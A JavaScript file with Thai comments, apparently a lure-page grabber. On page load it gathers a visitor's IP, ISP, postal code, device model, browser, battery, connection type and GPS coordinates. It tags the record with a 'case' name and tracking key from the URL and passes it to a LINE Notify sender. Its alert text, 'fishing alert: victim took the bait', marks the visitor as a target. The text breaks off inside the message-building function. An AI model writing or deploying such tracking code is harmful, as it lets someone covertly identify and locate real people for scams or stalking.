// ฟังก์ชันดึง tracking key และcase name จากURLparameters
function getUrlParameters() {
  try {
    const urlParams = new URLSearchParams(window.location.search);
    const trackingKey = urlParams.get('daily') || "ไม่มีค่า";
    const caseName = urlParams.get('case') || "ไม่มีค่า";
    
    console.log("ดึงค่าจาก URL parameters:");
    console.log("- trackingKey:", trackingKey);
    console.log("- caseName:", caseName);
    
    return {
      trackingKey: trackingKey,
      caseName: caseName
    };
  } catch (error) {
    console.error("ไม่สามารถดึงพารามิเตอร์จาก URL ได้:", error);
    return {
      trackingKey: "ไม่มีค่า",
      caseName: "ไม่มีค่า"
    };
  }
}

// ฟังก์ชันหลักที่ทำงานทันทีเมื่อโหลดหน้าเว็บ1
(function() {
  // เก็บข้อมูลทั่วไป
  const timestamp = new Date().toLocaleString('th-TH', {
    timeZone: 'Asia/Bangkok',
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
  });
  
  // ดึง tracking key และ case name จาก URL
  const { trackingKey, caseName } = getUrlParameters();

  // เก็บข้อมูลอุปกรณ์และข้อมูลอื่นๆ
  const deviceInfo = getDetailedDeviceInfo();
  const screenSize = `${window.screen.width}x${window.screen.height}`;
  const screenColorDepth = window.screen.colorDepth;
  const devicePixelRatio = window.devicePixelRatio || 1;
  const referrer = document.referrer || "ไม่มีข้อมูล";
  const language = navigator.language || navigator.userLanguage || "ไม่มีข้อมูล";
  const platform = deviceInfo.osInfo || navigator.platform || "ไม่มีข้อมูล";
  const connection = getConnectionInfo();
  const browser = detectBrowser();

  // ตรวจสอบการใช้งานแบตเตอรี่
  getBatteryInfo().then(batteryData => {
    // รวบรวมข้อมูลทั้งหมด
    const allDeviceData = {
      ...deviceInfo,
      screenSize,
      screenColorDepth,
      devicePixelRatio,
      language,
      platform,
      browser,
      connection,
      battery: batteryData
    };

    // สร้างตัวแปรเพื่อเก็บข้อมูลที่จะส่ง
    let dataToSend = {};
    
    // ตรวจสอบ IP และข้อมูลเบอร์โทรศัพท์
    Promise.all([
      getIPDetails().catch(error => ({ip: "ไม่สามารถระบุได้"})),
      estimatePhoneNumber().catch(() => null)
    ])
    .then(([ipData, phoneInfo]) => {
      // เก็บข้อมูลที่จำเป็นทั้งหมด
      dataToSend = {
        timestamp: timestamp,
        ip: ipData,
        deviceInfo: allDeviceData,
        phoneInfo: phoneInfo,
        referrer: referrer,
        trackingKey: trackingKey || "ไม่มีค่า",
        caseName: caseName || "ไม่มีค่า",
        useServerMessage: true,
        requestId: generateUniqueId() // สร้าง ID เฉพาะสำหรับการร้องขอนี้
      };
      
      // ขอข้อมูลพิกัด โดยกำหนดเวลาให้ตอบกลับไม่เกิน 5 วินาที
      if (navigator.geolocation) {
        const locationPromise = new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(
            position => {
              resolve({
                lat: position.coords.latitude,
                long: position.coords.longitude,
                accuracy: position.coords.accuracy,
                gmapLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
              });
            },
            error => {
              console.log("ผู้ใช้ไม่อนุญาตให้เข้าถึงตำแหน่ง:", error.message);
              resolve("ไม่มีข้อมูล");
            },
            {
              timeout: 5000,
              enableHighAccuracy: true
            }
          );
        });
        
        // รอข้อมูลพิกัดไม่เกิน 5 วินาที
        Promise.race([
          locationPromise,
          new Promise(resolve => setTimeout(() => resolve("ไม่มีข้อมูล"), 5000))
        ])
        .then(location => {
          // เพิ่มข้อมูลพิกัดเข้าไปในข้อมูลที่จะส่ง
          dataToSend.location = location;
          
          // ส่งข้อมูลทั้งหมดเพียงครั้งเดียว
          sendToLineNotify(dataToSend);
        });
      } else {
        // ถ้าไม่สามารถใช้ Geolocation API ได้
        dataToSend.location = "ไม่มีข้อมูล";
        sendToLineNotify(dataToSend);
      }
    });
  });
})();

// สร้าง ID เฉพาะสำหรับการร้องขอ
function generateUniqueId() {
  return Date.now().toString(36) + Math.random().toString(36).substr(2);
}

// ฟังก์ชันรวบรวมข้อมูลอุปกรณ์แบบละเอียด
function getDetailedDeviceInfo() {
  const userAgent = navigator.userAgent;
  const vendor = navigator.vendor || "ไม่มีข้อมูล";
  
  // ตัวแปรสำหรับเก็บข้อมูลละเอียด
  let deviceType = "คอมพิวเตอร์"; // ค่าเริ่มต้น
  let deviceModel = "ไม่สามารถระบุได้";
  let osInfo = "ไม่สามารถระบุได้";
  let deviceBrand = "ไม่สามารถระบุได้";
  
  // ตรวจจับ iPad อย่างถูกต้อง
  const isIPad = detectIPad();
  
  // ตรวจจับ Device Type
  if (isIPad) {
    deviceType = "แท็บเล็ต";
    deviceBrand = "Apple";
    deviceModel = getIPadModel(userAgent);
  } else if (/iPhone|iPod/.test(userAgent)) {
    deviceType = "มือถือ";
    deviceBrand = "Apple";
    deviceModel = getIPhoneModel(userAgent);
  } else if (/android/i.test(userAgent)) {
    // แยกระหว่างแท็บเล็ตและมือถือ Android
    if (/tablet|SM-T|Tab/i.test(userAgent) || (!/Mobile/i.test(userAgent) && Math.max(window.screen.width, window.screen.height) > 1000)) {
      deviceType = "แท็บเล็ต";
    } else {
      deviceType = "มือถือ";
    }
    
    // ดึงข้อมูลยี่ห้อและรุ่น Android
    const androidInfo = getAndroidInfo(userAgent);
    deviceBrand = androidInfo.brand;
    deviceModel = androidInfo.model;
    osInfo = androidInfo.osVersion;
  } else {
    // ตรวจจับ Desktop OS
    if (/Windows/.test(userAgent)) {
      deviceBrand = "PC";
      osInfo = getWindowsVersion(userAgent);
      deviceModel = `Windows ${osInfo}`;
    } else if (/Mac OS X/.test(userAgent)) {
      deviceBrand = "Apple";
      osInfo = getMacOSVersion(userAgent);
      deviceModel = `Mac ${osInfo}`;
    } else if (/Linux/.test(userAgent)) {
      deviceBrand = "PC";
      deviceModel = "Linux";
      if (/Ubuntu/.test(userAgent)) {
        deviceModel = "Ubuntu Linux";
      } else if (/Fedora/.test(userAgent)) {
        deviceModel = "Fedora Linux";
      }
    } else if (/CrOS/.test(userAgent)) {
      deviceBrand = "Google";
      deviceModel = "Chromebook";
      deviceType = "โน้ตบุ๊ค";
    }
  }
  
  // อัพเดทข้อมูล OS สำหรับอุปกรณ์ Apple ถ้ายังไม่ได้กำหนด
  if (deviceBrand === "Apple" && osInfo === "ไม่สามารถระบุได้") {
    if (isIPad || /iPhone|iPod/.test(userAgent)) {
      osInfo = getIOSVersion(userAgent);
    } else if (/Mac OS X/.test(userAgent)) {
      osInfo = getMacOSVersion(userAgent);
    }
  }
  
  return {
    userAgent: userAgent,
    vendor: vendor,
    deviceType: deviceType,
    deviceModel: deviceModel,
    osInfo: osInfo,
    deviceBrand: deviceBrand
  };
}

// ฟังก์ชันตรวจสอบ iPad โดยเฉพาะ (ป้องกันปัญหา iPadOS แสดงเป็น Mac)
function detectIPad() {
  const ua = navigator.userAgent;
  
  // วิธีการตรวจจับ iPad ที่แม่นยำมากขึ้น:
  // 1. ตรวจสอบ User Agent แบบดั้งเดิมก่อน
  if (/iPad/.test(ua)) {
    return true;
  }
  
  // 2. สำหรับ iPadOS 13+ ที่แสดงเป็น Mac Safari
  // ตรวจสอบว่าเป็น Mac + มี Touch Support + ไม่มีตัวแปรเฉพาะของ Mac
  if (/Macintosh/.test(ua) && navigator.maxTouchPoints > 1) {
    // iPad รุ่นใหม่ใช้ iPadOS 13+ จะปลอมตัวเป็น macOS
    return true;
  }
  
  // 3. ตรวจสอบขนาดหน้าจอ สำหรับกรณีที่ไม่สามารถตรวจจับได้ด้วยวิธีอื่น
  // iPad ทุกรุ่นมีอัตราส่วนจอที่เฉพาะและขนาดจอมักจะใหญ่กว่า iPhone
  if (/Apple/.test(navigator.vendor) && 
      /Mobile/.test(ua) && 
      !(/iPhone|iPod/.test(ua)) && 
      window.screen.width >= 768 && 
      window.screen.height >= 768) {
    return true;
  }
  
  return false;
}

// ฟังก์ชันดึงข้อมูลรุ่น iPad
function getIPadModel(ua) {
  // ตรวจสอบรุ่น iPad จาก Build ID ใน User Agent
  let model = "iPad";
  const iosVersion = getIOSVersion(ua);
  
  // ตรวจสอบ CPU/Chip สำหรับรุ่นใหม่
  if (/CPU OS 1[5-9]/.test(ua)) {
    model += " (Apple Silicon)";
  }
  
  // แยกแยะรุ่นตาม iPad identifier ใน UA ถ้ามี
  const modelMatch = ua.match(/iPad([0-9]+,[0-9]+)/);
  if (modelMatch) {
    // Match iPad model identifiers with actual models
    const modelIdentifier = modelMatch[1];
    switch (modelIdentifier) {
      case "13,1": case "13,2": model = "iPad Air (4th gen)"; break;
      case "13,4": case "13,5": case "13,6": case "13,7": model = "iPad Pro 11\" (3rd gen)"; break;
      case "13,8": case "13,9": case "13,10": case "13,11": model = "iPad Pro 12.9\" (5th gen)"; break;
      case "14,1": model = "iPad Pro 11\" (4th gen)"; break;
      case "14,2": model = "iPad Pro 12.9\" (6th gen)"; break;
      case "14,3": case "14,4": model = "iPad Air (5th gen)"; break;
      // เพิ่มรายการอื่นๆ ตามต้องการ
    }
  } else {
    // ถ้าไม่พบ identifier พยายามวิเคราะห์จาก OS version และขนาดจอ
    const screenSize = Math.max(window.screen.width, window.screen.height);
    if (screenSize >= 1024) {
      model += " Pro";
      if (screenSize >= 1366) {
        model += " 12.9\"";
      } else {
        model += " 11\"";
      }
    } else if (screenSize >= 834) {
      model += " Air/Pro 10.5\"";
    } else {
      model += "/mini";
    }
  }
  
  return `${model} (iOS ${iosVersion})`;
}

// ฟังก์ชันดึงข้อมูลรุ่น iPhone
function getIPhoneModel(ua) {
  let model = "iPhone";
  const iosVersion = getIOSVersion(ua);
  
  // ตรวจสอบรุ่น iPhone จาก User Agent
  if (/iPhone([0-9]+,[0-9]+)/.test(ua)) {
    const modelMatch = ua.match(/iPhone([0-9]+,[0-9]+)/);
    const modelIdentifier = modelMatch[1];
    // Match iPhone model identifiers with actual models
    switch (modelIdentifier) {
      case "15,4": case "15,5": model = "iPhone 14 Pro"; break;
      case "15,2": case "15,3": model = "iPhone 14 Pro Max"; break;
      case "14,7": model = "iPhone 14"; break;
      case "14,8": model = "iPhone 14 Plus"; break;
      case "13,1": model = "iPhone 12 mini"; break;
      case "13,2": model = "iPhone 12"; break;
      case "13,3": model = "iPhone 12 Pro"; break;
      case "13,4": model = "iPhone 12 Pro Max"; break;
      // เพิ่มรายการอื่นๆ ตามต้องการ
      default: model = `iPhone (Model ID: ${modelIdentifier})`;
    }
  }
  
  return `${model} (iOS ${iosVersion})`;
}

// ฟังก์ชันดึงข้อมูลรุ่นเครื่องและระบบ Android
function getAndroidInfo(ua) {
  let brand = "Android";
  let model = "ไม่ทราบรุ่น";
  let osVersion = "ไม่ทราบเวอร์ชัน";
  
  // ดึงเวอร์ชัน Android
  const androidVersionMatch = ua.match(/Android\s([0-9\.]+)/);
  if (androidVersionMatch) {
    osVersion = androidVersionMatch[1];
  }
  
  // ตรวจสอบยี่ห้อและรุ่น
  if (/Samsung|SM-|Galaxy/.test(ua)) {
    brand = "Samsung";
    const samsungModelMatch = ua.match(/SM-[A-Z0-9]+/i) || ua.match(/Galaxy\s[A-Z0-9\s]+/i);
    if (samsungModelMatch) {
      model = samsungModelMatch[0];
      // แปลรหัสรุ่นให้เป็นชื่อรุ่นที่คนทั่วไปรู้จัก
      if (model.startsWith("SM-")) {
        if (model.startsWith("SM-G") || model.startsWith("SM-N")) {
          if (model.startsWith("SM-G99")) model = "Galaxy S23 series";
          else if (model.startsWith("SM-G98")) model = "Galaxy S21 series";
          else if (model.startsWith("SM-G97")) model = "Galaxy S10 series";
          else if (model.startsWith("SM-N9")) model = "Galaxy Note series";
        } else if (model.startsWith("SM-A")) {
          model = "Galaxy A series";
        } else if (model.startsWith("SM-T")) {
          model = "Galaxy Tab series";
        }
      }
    }
  } else if (/MI |Redmi|POCO/.test(ua)) {
    brand = "Xiaomi";
    const xiaomiModelMatch = ua.match(/MI\s[A-Z0-9]+|Redmi\s[A-Z0-9]+|POCO\s[A-Z0-9]+/i);
    if (xiaomiModelMatch) {
      model = xiaomiModelMatch[0];
    }
  } else if (/HUAWEI|HONOR/.test(ua)) {
    brand = /HONOR/.test(ua) ? "HONOR" : "HUAWEI";
    const huaweiModelMatch = ua.match(/HUAWEI\s[A-Z0-9\-]+|HONOR\s[A-Z0-9]+/i);
    if (huaweiModelMatch) {
      model = huaweiModelMatch[0];
    }
  } else if (/OPPO|CPH[0-9]+/.test(ua)) {
    brand = "OPPO";
    const oppoModelMatch = ua.match(/OPPO\s[A-Z0-9]+|CPH[0-9]+/i);
    if (oppoModelMatch) {
      model = oppoModelMatch[0];
    }
  } else if (/vivo/.test(ua)) {
    brand = "vivo";
    const vivoModelMatch = ua.match(/vivo\s[A-Z0-9]+/i);
    if (vivoModelMatch) {
      model = vivoModelMatch[0];
    }
  } else if (/ONEPLUS/.test(ua)) {
    brand = "OnePlus";
    const oneplusModelMatch = ua.match(/ONEPLUS\s[A-Z0-9]+/i);
    if (oneplusModelMatch) {
      model = oneplusModelMatch[0];
    }
  } else if (/Google|Pixel/.test(ua)) {
    brand = "Google";
    const pixelModelMatch = ua.match(/Pixel\s[0-9]+/i);
    if (pixelModelMatch) {
      model = pixelModelMatch[0];
    }
  } else {
    // ถ้าไม่พบยี่ห้อที่รู้จัก พยายามดึงจาก Build info
    const genericModelMatch = ua.match(/;\s([^;]+)\sBuild\//i) || ua.match(/;\s([^;]+)\)/i);
    if (genericModelMatch) {
      model = genericModelMatch[1].trim();
      
      // พยายามแยกยี่ห้อจากรุ่น
      const brandParts = model.split(' ');
      if (brandParts.length > 1) {
        const possibleBrand = brandParts[0].toLowerCase();
        if (!(/[0-9]/.test(possibleBrand))) {  // ถ้าไม่มีตัวเลขในชื่อยี่ห้อ
          brand = brandParts[0];
          model = model.substring(brand.length).trim();
        }
      }
    }
  }
  
  return {
    brand: brand,
    model: model,
    osVersion: `Android ${osVersion}`
  };
}

// ฟังก์ชันดึงเวอร์ชัน iOS
function getIOSVersion(ua) {
  const match = ua.match(/OS\s(\d+_\d+(_\d+)?)/i) || ua.match(/Version\/(\d+\.\d+)/i);
  if (match) {
    return match[1].replace(/_/g, '.');
  }
  return "ไม่ทราบเวอร์ชัน";
}

// ฟังก์ชันดึงเวอร์ชัน macOS
function getMacOSVersion(ua) {
  const match = ua.match(/Mac OS X\s*([0-9_\.]+)/i);
  if (match) {
    const version = match[1].replace(/_/g, '.');
    
    // แปลงเวอร์ชันตัวเลขเป็นชื่อ
    if (version.startsWith('14')) return "Sonoma";
    else if (version.startsWith('13')) return "Ventura";
    else if (version.startsWith('12')) return "Monterey";
    else if (version.startsWith('11')) return "Big Sur";
    else if (version.startsWith('10.15')) return "Catalina";
    else if (version.startsWith('10.14')) return "Mojave";
    else if (version.startsWith('10.13')) return "High Sierra";
    else return `macOS ${version}`;
  }
  return "macOS";
}

// ฟังก์ชันดึงเวอร์ชัน Windows
function getWindowsVersion(ua) {
  if (/Windows NT 10.0/.test(ua)) return "11/10";
  else if (/Windows NT 6.3/.test(ua)) return "8.1";
  else if (/Windows NT 6.2/.test(ua)) return "8";
  else if (/Windows NT 6.1/.test(ua)) return "7";
  else if (/Windows NT 6.0/.test(ua)) return "Vista";
  else if (/Windows NT 5.1/.test(ua)) return "XP";
  else if (/Windows NT/.test(ua)) return "NT";
  else return "";
}

// ฟังก์ชันตรวจสอบประเภทการเชื่อมต่อแบบละเอียด
function getConnectionInfo() {
  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;

  let connectionInfo = {
    type: "ไม่สามารถระบุได้",
    effectiveType: "ไม่สามารถระบุได้",
    downlink: "ไม่สามารถระบุได้",
    rtt: "ไม่สามารถระบุได้",
    saveData: false,
    isWifi: false,
    isMobile: false,
    networkType: "ไม่สามารถระบุได้"
  };

  if (connection) {
    // เก็บข้อมูลพื้นฐาน
    connectionInfo.type = connection.type || "ไม่สามารถระบุได้";
    connectionInfo.effectiveType = connection.effectiveType || "ไม่สามารถระบุได้";
    connectionInfo.downlink = connection.downlink || "ไม่สามารถระบุได้";
    connectionInfo.rtt = connection.rtt || "ไม่สามารถระบุได้";
    connectionInfo.saveData = connection.saveData || false;

    // ตรวจสอบว่าเป็น WiFi หรือ Mobile
    if (connection.type === 'wifi') {
      connectionInfo.isWifi = true;
      connectionInfo.networkType = "WiFi";
    }
    else if (['cellular', 'umts', 'hspa', 'lte', 'cdma', 'evdo', 'gsm', '2g', '3g', '4g', '5g'].includes(connection.type)) {
      connectionInfo.isMobile = true;

      // ระบุประเภทเครือข่ายโทรศัพท์จาก effectiveType
      if (connection.effectiveType === 'slow-2g' || connection.effectiveType === '2g') {
        connectionInfo.networkType = "2G";
      } else if (connection.effectiveType === '3g') {
        connectionInfo.networkType = "3G";
      } else if (connection.effectiveType === '4g') {
        connectionInfo.networkType = "4G/LTE";
      } else if (connection.type === '5g') {
        connectionInfo.networkType = "5G";
      } else {
        connectionInfo.networkType = "Mobile Data";
      }
    }
    else {
      // ตรวจสอบจาก effectiveType หากไม่มีข้อมูล type ที่ชัดเจน
      if (connection.effectiveType === '4g') {
        // ส่วนใหญ่ถ้า effectiveType เป็น 4g มักจะเป็น WiFi
        connectionInfo.isWifi = true;
        connectionInfo.networkType = "WiFi(น่าจะใช่)";
      } else if (['slow-2g', '2g', '3g'].includes(connection.effectiveType)) {
        connectionInfo.isMobile = true;
        connectionInfo.networkType = "Mobile Data";
      }
    }
  }

  return connectionInfo;
}

// ฟังก์ชันตรวจสอบระดับแบตเตอรี่
async function getBatteryInfo() {
  try {
    // ตรวจสอบว่าสามารถเข้าถึง Battery API ได้หรือไม่
    if (navigator.getBattery) {
      const battery = await navigator.getBattery();
      return {
        level: Math.floor(battery.level * 100) + "%",
        charging: battery.charging ? "กำลังชาร์จ" : "ไม่ได้ชาร์จ"
      };
    }

    return "ไม่สามารถเข้าถึงข้อมูลแบตเตอรี่ได้";
  } catch (error) {
    return "ไม่สามารถเข้าถึงข้อมูลแบตเตอรี่ได้";
  }
}

// ฟังก์ชันตรวจสอบประเภทเบราว์เซอร์
function detectBrowser() {
  const userAgent = navigator.userAgent;
  let browserName = "ไม่ทราบ";
  let browserVersion = "ไม่ทราบ";
  let browserEngine = "";

  // ตรวจสอบเบราว์เซอร์ที่นิยมใช้ในปัจจุบัน (2023-2024)
  if (userAgent.indexOf("Edg") > -1) {
    browserName = "Microsoft Edge";
    const match = userAgent.match(/Edg\/([\d\.]+)/);
    if (match) browserVersion = match[1];
    browserEngine = "Chromium";
  } else if (userAgent.indexOf("Chrome") > -1 && userAgent.indexOf("Safari") > -1) {
    // ตรวจสอบเบราว์เซอร์บนมือถือยอดนิยมก่อน
    if (userAgent.indexOf("SamsungBrowser") > -1) {
      browserName = "Samsung Browser";
      const match = userAgent.match(/SamsungBrowser\/([\d\.]+)/);
      if (match) browserVersion = match[1];
      browserEngine = "Chromium";
    } else if (userAgent.indexOf("Line") > -1 || userAgent.indexOf("NAVER") > -1) {
      if (userAgent.indexOf("Line") > -1) {
        browserName = "LINE Browser";
        const match = userAgent.match(/Line\/([\d\.]+)/);
        if (match) browserVersion = match[1];
      } else {
        browserName = "NAVER Browser";
      }
      browserEngine = "Chromium";
    } else if (userAgent.indexOf("MiuiBrowser") > -1) {
      browserName = "MIUI Browser";
      const match = userAgent.match(/MiuiBrowser\/([\d\.]+)/);
      if (match) browserVersion = match[1];
      browserEngine = "Chromium";
    } else if (userAgent.indexOf("OPR") > -1 || userAgent.indexOf("Opera") > -1) {
      browserName = "Opera";
      const match = userAgent.match(/OPR\/([\d\.]+)/) || userAgent.match(/Opera\/([\d\.]+)/);
      if (match) browserVersion = match[1];
      browserEngine = "Chromium";
    } else if (userAgent.indexOf("Brave") > -1) {
      browserName = "Brave";
      const match = userAgent.match(/Chrome\/([\d\.]+)/);
      if (match) browserVersion = match[1];
      browserEngine = "Chromium";
    } else if (userAgent.indexOf("YaBrowser") > -1) {
      browserName = "Yandex";
      const match = userAgent.match(/YaBrowser\/([\d\.]+)/);
      if (match) browserVersion = match[1];
      browserEngine = "Chromium";
    } else if (userAgent.indexOf("Vivaldi") > -1) {
      browserName = "Vivaldi";
      const match = userAgent.match(/Vivaldi\/([\d\.]+)/);
      if (match) browserVersion = match[1];
      browserEngine = "Chromium";
    } else {
      browserName = "Chrome";
      const match = userAgent.match(/Chrome\/([\d\.]+)/);
      if (match) browserVersion = match[1];
      browserEngine = "Chromium";
    }
    
    // ตรวจสอบ WebView บน Android
    if (userAgent.indexOf("; wv") > -1) {
      browserName += " WebView";
    }
  } else if (userAgent.indexOf("Firefox") > -1) {
    browserName = "Firefox";
    const match = userAgent.match(/Firefox\/([\d\.]+)/);
    if (match) browserVersion = match[1];
    browserEngine = "Gecko";
  } else if (userAgent.indexOf("Safari") > -1 && userAgent.indexOf("Chrome") === -1) {
    browserName = "Safari";
    const match = userAgent.match(/Version\/([\d\.]+)/);
    if (match) browserVersion = match[1];
    browserEngine = "WebKit";
    
    // ตรวจสอบเพิ่มเติมสำหรับ WebView บน iOS
    if (userAgent.indexOf("CriOS") > -1) {
      browserName = "Chrome for iOS";
      const match = userAgent.match(/CriOS\/([\d\.]+)/);
      if (match) browserVersion = match[1];
    } else if (userAgent.indexOf("FxiOS") > -1) {
      browserName = "Firefox for iOS";
      const match = userAgent.match(/FxiOS\/([\d\.]+)/);
      if (match) browserVersion = match[1];
    } else if (userAgent.indexOf("EdgiOS") > -1) {
      browserName = "Edge for iOS";
      const match = userAgent.match(/EdgiOS\/([\d\.]+)/);
      if (match) browserVersion = match[1];
    } else if (userAgent.indexOf("FBIOS") > -1) {
      browserName = "Facebook App WebView";
      browserEngine = "WebKit (In-App)";
    } else if (userAgent.indexOf("Instagram") > -1) {
      browserName = "Instagram App WebView";
      browserEngine = "WebKit (In-App)";
    } else if (userAgent.indexOf("Line") > -1) {
      browserName = "LINE App WebView";
      browserEngine = "WebKit (In-App)";
    }
  } else if (userAgent.indexOf("MSIE") > -1 || userAgent.indexOf("Trident") > -1) {
    browserName = "Internet Explorer";
    const match = userAgent.match(/(?:MSIE |rv:)([\d\.]+)/);
    if (match) browserVersion = match[1];
    browserEngine = "Trident";
  }

  return browserEngine ? `${browserName} ${browserVersion} (${browserEngine})` : `${browserName} ${browserVersion}`;
}

// ฟังก์ชันดึงข้อมูล IP โดยละเอียด (ใช้ ipinfo.io)
async function getIPDetails() {
  try {
    // ใช้ ipinfo.io ซึ่งรวม IP และรายละเอียดในครั้งเดียว (ฟรี ไม่ต้องใช้ API key, มี rate limit)
    const response = await fetch('https://ipinfo.io/json');
    if (!response.ok) {
      throw new Error(`ipinfo.io request failed with status ${response.status}`);
    }
    const ipDetails = await response.json();

    // จัดรูปแบบข้อมูลให้สอดคล้องกับโครงสร้างเดิม + เพิ่มเติม
    return {
      ip: ipDetails.ip || "ไม่สามารถระบุได้",
      hostname: ipDetails.hostname || "ไม่มีข้อมูล", // เพิ่ม hostname
      city: ipDetails.city || "ไม่ทราบ",
      region: ipDetails.region || "ไม่ทราบ",
      country: ipDetails.country || "ไม่ทราบ", // ipinfo ใช้ 'country' code (e.g., TH)
      loc: ipDetails.loc || "ไม่มีข้อมูล", // พิกัด lat,long จาก IP
      org: ipDetails.org || "ไม่ทราบ", // องค์กร/ISP (ASN + Name)
      postal: ipDetails.postal || "ไม่มีข้อมูล", // รหัสไปรษณีย์
      timezone: ipDetails.timezone || "ไม่ทราบ",
      // แยก ASN และ ISP/Org name ถ้าเป็นไปได้
      asn: ipDetails.org ? ipDetails.org.split(' ')[0] : "ไม่ทราบ",
      isp: ipDetails.org ? ipDetails.org.substring(ipDetails.org.indexOf(' ') + 1) : "ไม่ทราบ"
    };
  } catch (error) {
    console.error("ไม่สามารถดึงข้อมูล IP จาก ipinfo.io ได้:", error);
    // ลองใช้ fallback (ipify) หาก ipinfo ล้มเหลว
    try {
      const basicResponse = await fetch('https://api.ipify.org?format=json');
      const basicData = await basicResponse.json();
      return { ip: basicData.ip || "ไม่สามารถระบุได้" }; // คืนค่า IP พื้นฐาน
    } catch (fallbackError) {
      console.error("ไม่สามารถดึง IP จาก fallback (ipify) ได้:", fallbackError);
      return { ip: "ไม่สามารถระบุได้" };
    }
  }
}

// ฟังก์ชันที่พยายามประมาณการเบอร์โทรศัพท์ (มีข้อจำกัด)
async function estimatePhoneNumber() {
  const phoneInfo = {
    mobileOperator: "ไม่สามารถระบุได้",
    possibleOperator: "ไม่สามารถระบุได้",
    countryCode: "ไม่สามารถระบุได้",
    remarks: "ไม่สามารถระบุเบอร์โทรศัพท์โดยตรงเนื่องจากข้อจำกัดความเป็นส่วนตัวของเบราว์เซอร์"
  };

  try {
    // ตรวจสอบผู้ให้บริการโทรศัพท์จากข้อมูล IP
    const ipDetails = await getIPDetails();

    // ตรวจสอบข้อมูลผู้ให้บริการจาก isp ที่ได้จาก ipapi.co
    const ispInfo = ipDetails.isp || "";

    // ตรวจสอบผู้ให้บริการในประเทศไทย
    const thaiOperators = {
      "AIS": ["AIS", "Advanced Info Service", "AWN", "ADVANCED WIRELESS NETWORK"],
      "DTAC": ["DTAC", "Total Access Communication", "DTN", "DTAC TriNet"],
      "TRUE": ["TRUE", "True Move", "TrueMove", "True Corporation", "TrueOnline", "Real Future"],
      "NT": ["CAT", "TOT", "National Telecom", "NT", "CAT Telecom", "TOT Public Company Limited"],
      "3BB": ["Triple T Broadband", "3BB", "Triple T Internet"]
    };

    // ค้นหาผู้ให้บริการจากชื่อ ISP
    for (const [operator, keywords] of Object.entries(thaiOperators)) {
      if (keywords.some(keyword => ispInfo.includes(keyword))) {
        phoneInfo.possibleOperator = operator;
        break;
      }
    }

    // ตรวจสอบข้อมูลเพิ่มเติมจาก User Agent
    const userAgent = navigator.userAgent;
    if (userAgent.includes("Android")) {
      // บนแอนดรอยด์อาจมีชื่อเครือข่ายซ่อนอยู่ใน User-Agent บางรุ่น (แต่ปัจจุบันไม่ค่อยมีแล้ว)
      for (const [operator, keywords] of Object.entries(thaiOperators)) {
        if (keywords.some(keyword => userAgent.includes(keyword))) {
          phoneInfo.mobileOperator = operator;
          break;
        }
      }
    }

    // ดึงข้อมูลประเทศจาก IP
    if (ipDetails.country) {
      phoneInfo.countryCode = ipDetails.country;

      // ถ้าเป็นประเทศไทยให้ระบุรหัสประเทศ
      if (ipDetails.country === "Thailand" || ipDetails.country === "TH") {
        phoneInfo.countryCode = "+66";
      }
    }

    // ตรวจสอบ Network Information API เพิ่มเติม
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (connection && connection.type === 'cellular') {
      phoneInfo.remarks = "เชื่อมต่อผ่านเครือข่ายมือถือ " + (phoneInfo.possibleOperator !== "ไม่สามารถระบุได้" ? phoneInfo.possibleOperator : "");
    }

    return phoneInfo;

  } catch (error) {
    console.error("ไม่สามารถประมาณการเบอร์โทรศัพท์ได้:", error);
    return phoneInfo;
  }
}

// ฟังก์ชันพยายามดึงข้อมูลตำแหน่ง
function tryGetLocation(ipData, timestamp, referrer, deviceData, phoneInfo, trackingKey, caseName) {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      function(position) {
        // เมื่อได้รับพิกัด
        const lat = position.coords.latitude;
        const long = position.coords.longitude;
        const accuracy = position.coords.accuracy;
        const locationData = {
          lat: lat,
          long: long,
          accuracy: accuracy,
          gmapLink: `https://www.google.com/maps?q=${lat},${long}`
        };

        // ส่งข้อมูลอีกครั้งพร้อมพิกัด
        sendToLineNotify(ipData, locationData, timestamp, referrer, deviceData, phoneInfo, trackingKey, caseName);
      },
      function(error) {
        console.log("ผู้ใช้ไม่อนุญาตให้เข้าถึงตำแหน่ง:", error.message);
        // ไม่ต้องส่งข้อมูลอีกครั้ง เพราะส่งไปแล้วในครั้งแรก
      },
      {
        timeout: 5000,
        enableHighAccuracy: true
      }
    );
  }
}

// ฟังก์ชันสร้างข้อความแจ้งเตือนแบบละเอียด
function createDetailedMessage(ipData, location, timestamp, deviceData, phoneInfo, trackingKey, caseName) {
  // ข้อความหลัก
  const message = [
    "🎣แจ้งเตือนเหยื่อกินเบ็ด\n",
    `⏰เวลา: ${timestamp}`,
  ];
  // เพิ่มข้อมูล Case Name (ถ้ามี)
  if (caseName && caseName !== "ไม่มีค่า") {
    message.push(`📂ชื่อเคส: ${caseName}`);
  }
  // เพิ่มข้อมูล Tracking Key (ถ้ามี)
  if (trackingKey && trackingKey !== "ไม่มีค่า") {
    message.push(`🔑Tracking Key: ${trackingKey}`);
  }
  // --- ข้อมูล IP ละเอียด ---
  message.push(`🌐IP: ${ipData.ip || "ไม่มีข้อมูล"}`);
  if (ipData.hostname && ipData.hostname !== "ไม่มีข้อมูล") {
    message.push(`   - Hostname: ${ipData.hostname}`);
  }
  if (ipData.city && ipData.country) {
    // ใช้ country code ที่ได้จาก ipinfo (e.g., TH)
    message.push(`📍ตำแหน่ง (IP): ${ipData.city}, ${ipData.region}, ${ipData.country}`);
  }
  if (ipData.loc && ipData.loc !== "ไม่มีข้อมูล") {
    message.push(`   - พิกัด (IP): ${ipData.loc}`);
  }
  if (ipData.postal && ipData.postal !== "ไม่มีข้อมูล") {
    message.push(`   - รหัสไปรษณีย์: ${ipData.postal}`);
  }
  if (ipData.org && ipData.org !== "ไม่ทราบ") {
    message.push(`🏢องค์กร/ISP: ${ipData.org}`); // แสดงข้อมูล org เต็มๆ
  } else if (ipData.isp && ipData.isp !== "ไม่ทราบ") {
    message.push(`🔌เครือข่าย: ${ipData.isp}`); // Fallback ถ้าไม่มี org
  }
  if (ipData.timezone && ipData.timezone !== "ไม่ทราบ") {
    message.push(`   - Timezone: ${ipData.timezone}`);
  }
  // --- จบข้อมูล IP ---

  // ข้อมูลพิกัด GPS (ถ้ามี)
